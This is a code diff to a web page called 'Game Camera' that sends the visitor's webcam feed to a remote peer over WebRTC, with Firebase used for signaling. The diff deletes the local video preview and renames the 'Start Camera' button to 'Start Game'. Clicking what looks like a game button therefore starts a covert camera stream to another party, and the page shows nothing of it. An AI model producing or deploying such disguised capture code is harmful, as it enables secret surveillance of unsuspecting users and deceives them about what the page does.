@@ -5,15 +5,30 @@
   <title>Game Camera</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background:#111; color:#fff; }
-    video { width: 90%; max-width: 500px; border:2px solid #fff; border-radius:8px; margin-bottom:10px; }
-    button { padding: 10px 20px; font-size: 16px; border-radius:5px; border:none; background:#00aaff; color:#fff; cursor:pointer; }
+    body { 
+      font-family: sans-serif; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      justify-content: center; 
+      height: 100vh; 
+      background: #111; 
+      color: #fff; 
+    }
+    button { 
+      padding: 10px 20px; 
+      font-size: 16px; 
+      border-radius:5px; 
+      border:none; 
+      background:#00aaff; 
+      color:#fff; 
+      cursor:pointer; 
+    }
   </style>
 </head>
 <body>
   <h1>Game Camera</h1>
-  <video id="localVideo" autoplay muted playsinline></video>
-  <button id="start">Start Camera</button>
+  <button id="start">Start Game</button> <!-- Tombol diubah di sini -->
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
@@ -34,17 +49,13 @@
     const room = "room1";
     const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
 
-    const localVideo = document.getElementById("localVideo");
     const startBtn = document.getElementById("start");
 
     pc.onicecandidate = e => { if(e.candidate) push(ref(db, room+"/candidates"), e.candidate.toJSON()); };
-    pc.ontrack = e => { console.log("Track received on sender?"); }; // sender biasanya tidak perlu track
-
     remove(ref(db, room+"/candidates")); // clear old candidates
 
     startBtn.onclick = async () => {
       const stream = await navigator.mediaDevices.getUserMedia({video:true});
-      localVideo.srcObject = stream;
       stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
       const offer = await pc.createOffer();
